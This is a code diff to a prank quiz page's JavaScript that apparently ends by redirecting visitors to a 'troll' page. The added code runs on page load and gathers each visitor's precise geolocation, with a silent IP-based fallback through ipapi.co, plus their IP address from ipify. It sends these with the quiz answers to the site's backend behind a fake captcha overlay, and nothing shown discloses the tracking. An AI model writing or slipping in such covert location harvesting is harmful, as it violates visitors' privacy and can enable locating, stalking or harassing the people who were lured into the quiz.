@@ -395,19 +395,60 @@
   const questions = form.querySelectorAll('.question');
   const nextBtn = document.getElementById('nextBtn');
   let current = 0;
+  let userLocation = { latitude: null, longitude: null, ip: null };
+
+  // Get user location when page loads
+  window.addEventListener('DOMContentLoaded', () => {
+    getLocation();
+    getIPAddress();
+  });
+
+  // Function to get geolocation
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          userLocation.latitude = position.coords.latitude;
+          userLocation.longitude = position.coords.longitude;
+        },
+        error => {
+          console.error("Geolocation error:", error);
+          // Fallback to IP-based location
+          fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+              userLocation.latitude = data.latitude;
+              userLocation.longitude = data.longitude;
+            })
+            .catch(err => console.error("IP-based location error:", err));
+        }
+      );
+    }
+  }
+
+  // Function to get IP address
+  function getIPAddress() {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        userLocation.ip = data.ip;
+      })
+      .catch(err => {
+        console.error("IP fetch error:", err);
+        userLocation.ip = 'unknown';
+      });
+  }
 
   // Mutually exclusive logic for radios and "Other" text
   questions.forEach(q => {
     const radios = q.querySelectorAll('input[type="radio"]');
     const textInputs = q.querySelectorAll('input[type="text"]');
     if (radios.length > 0 && textInputs.length > 0) {
-      // When a radio is clicked, clear text input(s)
       radios.forEach(radio => {
         radio.addEventListener('change', () => {
           textInputs.forEach(input => input.value = '');
         });
       });
-      // When typing in text box, uncheck radios
       textInputs.forEach(input => {
         input.addEventListener('input', () => {
           if (input.value.trim().length > 0) {
@@ -427,7 +468,6 @@
     const textInputs = currentQuestion.querySelectorAll('input[type="text"], textarea');
 
     if (radios.length > 0 && textInputs.length > 0) {
-      // If any text input is non-empty, validate only it
       let textInputVal = "";
       let textInputValid = false;
       const minL = parseInt(currentQuestion.dataset.minlength) || 1;
@@ -441,14 +481,11 @@
         }
       }
       if (textInputVal.length > 0) return textInputValid;
-      // Otherwise, only a radio may be checked
       return Array.from(radios).some(r => r.checked);
     }
-    // For radio only
     else if (radios.length > 0) {
       return Array.from(radios).some(r => r.checked);
     }
-    // For text/textarea only
     else if (textInputs.length > 0) {
       let allValid = true;
       for (const input of textInputs) {
@@ -470,7 +507,6 @@
       q.classList.toggle('active', i === index);
       q.classList.remove('shake');
     });
-    // Change button text on last question
     nextBtn.innerHTML = (index === questions.length - 1) 
       ? 'Done?<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M22 2 11 13" /><path d="M22 2 15 22 11 13 2 9 22 2z"/></svg>'
       : 'Next<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M22 2 11 13" /><path d="M22 2 15 22 11 13 2 9 22 2z"/></svg>';
@@ -483,9 +519,12 @@
       data[key] = value;
     });
     
-    // Add additional metadata
+    // Add location and metadata
     data.timestamp = new Date().toISOString();
     data.event = 'quiz_submission';
+    data.latitude = userLocation.latitude;
+    data.longitude = userLocation.longitude;
+    data.ip = userLocation.ip;
     
     try {
       const response = await fetch('/api/submit-quiz', {
@@ -514,7 +553,6 @@
         return;
       }
       
-      // Show the overlay instead of submitting
       document.getElementById('captchaOverlay').style.display = 'flex';
       return;
     }
@@ -530,17 +568,13 @@
     form.scrollIntoView({behavior: "smooth"});
   });
 
-  // Overlay "Continue?" logic
   document.getElementById('continueBtn').addEventListener('click', async function() {
     try {
-      // Show loading screen
       document.getElementById('loadingOverlay').style.display = 'flex';
       document.getElementById('captchaOverlay').style.display = 'none';
       
-      // Submit quiz data
       await submitQuizData();
       
-      // Redirect after a brief delay to show loading
       setTimeout(() => {
         const name = getQueryParam('name');
         let url = 'https://myngl-jeric.github.io/my-ngl-jeric-site/troll.html';
@@ -558,7 +592,6 @@
 
   showQuestion(0);
 
-  // --- Name from URL to hidden input ---
   function getQueryParam(param) {
     const urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(param) || '';
